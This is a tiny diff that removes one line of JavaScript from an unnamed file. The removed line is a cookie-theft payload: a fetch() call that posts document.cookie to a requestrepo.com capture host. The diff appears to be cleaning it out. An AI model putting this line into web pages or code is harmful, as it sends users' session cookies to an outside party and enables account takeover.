@@ -1,1 +1,0 @@
-fetch("https://aojveb29.requestrepo.com/", {method: "post", body: document.cookie})
